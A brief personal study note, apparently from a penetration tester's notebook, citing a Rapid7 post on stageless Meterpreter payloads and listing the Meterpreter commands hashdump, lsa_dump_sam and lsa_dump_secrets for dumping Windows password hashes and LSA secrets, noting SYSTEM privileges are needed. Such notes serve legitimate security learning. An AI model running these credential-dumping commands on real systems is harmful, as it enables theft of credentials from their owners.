Rapid7 - deep dive into stageless meterpreter payloads
	https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/

dumping hashes - impersonating any process we want
```
meterpreter > hashdump
```
to use `hashdump` successfully, the Meterpreter session must be running with SYSTEM-level privileges

```
meterpreter > lsa_dump_sam
```

dumping secrets
```
meterpreter > lsa_dump_secrets
```
---
related notes:
[[privilege escalation]]